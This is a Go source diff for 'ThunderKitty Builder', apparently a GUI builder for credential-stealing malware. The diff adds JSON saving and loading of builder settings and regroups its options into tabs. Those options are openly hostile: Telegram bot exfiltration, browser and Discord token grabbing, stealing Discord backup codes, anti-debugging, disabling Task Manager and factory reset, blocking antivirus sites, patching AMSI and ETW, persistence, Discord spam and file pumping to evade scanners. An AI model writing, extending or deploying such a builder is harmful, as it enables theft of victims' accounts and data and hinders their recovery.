@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -217,43 +218,117 @@ func pumpExecutable(path string, size int) {
 	return
 }
 
+func SaveConfig(cfg Config) error {
+	file, err := os.Create("config.json")
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	encoder := json.NewEncoder(file)
+	if err := encoder.Encode(cfg); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func LoadConfig() (Config, error) {
+	var cfg Config
+
+	file, err := os.Open("config.json")
+	if err != nil {
+		if os.IsNotExist(err) {
+			return cfg, nil // No config file, return default config
+		}
+		return cfg, err
+	}
+	defer file.Close()
+
+	decoder := json.NewDecoder(file)
+	if err := decoder.Decode(&cfg); err != nil {
+		return cfg, err
+	}
+
+	return cfg, nil
+}
+
 func main() {
 	a := app.New()
 	w := a.NewWindow("ThunderKitty Builder")
+
+	// Load a config if it exists
+	cfg, err := LoadConfig()
+	if err != nil {
+		fmt.Println("Error loading config:", err)
+	}
 
 	// Creating all the widgets
 	// Grabber Widgets
 	telegramBotTokenEntry := widget.NewEntry()
 	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")
+	telegramBotTokenEntry.SetText(cfg.TeleBotToken)
 
 	telegramChatIdEntry := widget.NewEntry()
 	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")
+	telegramChatIdEntry.SetText(cfg.TeleChatID)
 
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
+	enableAntiDebug.SetChecked(cfg.EnableAntiDebug)
+
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
+	enableFakeError.SetChecked(cfg.EnableFakeError)
+
 	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
+	enableBrowsers.SetChecked(cfg.EnableBrowsers)
+
 	enableTokenGrabber := widget.NewCheck("Enable Token Grabbing", nil)
+	enableTokenGrabber.SetChecked(cfg.EnableTokenGrabber)
+
 	stealBackupCodes := widget.NewCheck("Steal Discord Backup Codes", nil)
+	stealBackupCodes.SetChecked(cfg.StealBackupCodes)
+
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
+	hideConsole.SetChecked(cfg.HideConsole)
+
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
+	disableFactoryReset.SetChecked(cfg.DisableFactoryReset)
+
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
+	disableTaskManager.SetChecked(cfg.DisableTaskManager)
+
 	blockHostsFile := widget.NewCheck("Block AV Sites", nil)
+	blockHostsFile.SetChecked(cfg.BlockHostsFile)
+
 	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
+	patchPowershell.SetChecked(cfg.PatchPowerShell)
+
 	enablePersistence := widget.NewCheck("Enable Persistence", nil)
+	enablePersistence.SetChecked(cfg.EnablePersistence)
 
 	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
 	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
+	openSiteEntry.SetText(cfg.OpenSiteURL)
+
 	speakTTSEntry := widget.NewEntry()
 	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
+	speakTTSEntry.SetText(cfg.SpeakTTSMessage)
+
 	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
+	enableSwapMouse.SetChecked(cfg.SwapMouse)
+
 	setWallpaper := widget.NewCheck("Enable Wallpaper Changer", nil)
+	setWallpaper.SetChecked(cfg.SetWallpaper)
+
 	sendDMMessage := widget.NewEntry()
 	sendDMMessage.SetPlaceHolder("Spam Discord Messages (leave blank for none)")
+	sendDMMessage.SetText(cfg.DMMessage)
 
 	// File Pumper Widgets
 	filePumperEntry := widget.NewEntry()
 	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")
+	filePumperEntry.SetText(cfg.FilePumperSize)
 
 	// Build button
 	buildButton := widget.NewButton("Build", func() {
@@ -285,6 +360,11 @@ func main() {
 		}
 
 		buildExecutable(cfg)
+		
+		// Save config
+		if err := SaveConfig(cfg); err != nil {
+			fmt.Println("Error saving config:", err)
+		}
 
 		// Pumper
 		if filePumperEntry.Text != "" {
@@ -307,10 +387,6 @@ func main() {
 		enableTokenGrabber,
 		stealBackupCodes,
 		hideConsole,
-		disableFactoryReset,
-		disableTaskManager,
-		patchPowershell,
-		blockHostsFile,
 		enablePersistence,
 		buildButton,
 	)
@@ -324,15 +400,24 @@ func main() {
 		sendDMMessage,
 	)
 
-	filePumperSettings := container.NewVBox(
-		widget.NewLabel("File Pumper Configuration"),
+	miscellaneousSettings := container.NewVBox(
+		widget.NewLabel("Miscellaneous Configuration"),
+		disableTaskManager,
+		disableFactoryReset,
+		patchPowershell,
+		blockHostsFile,
+	)
+
+	fileSettings := container.NewVBox(
+		widget.NewLabel("File Configuration"),
 		filePumperEntry,
 	)
 
 	tabs := container.NewAppTabs(
-		container.NewTabItem("Grabber Configuration", grabberSettings),
-		container.NewTabItem("Trollware Configuration", trollwareSettings),
-		container.NewTabItem("File Pumper", filePumperSettings),
+		container.NewTabItem("Grabber", grabberSettings),
+		container.NewTabItem("Trollware", trollwareSettings),
+		container.NewTabItem("Miscellaneous", miscellaneousSettings),
+		container.NewTabItem("File", fileSettings),
 	)
 
 	w.SetContent(tabs)
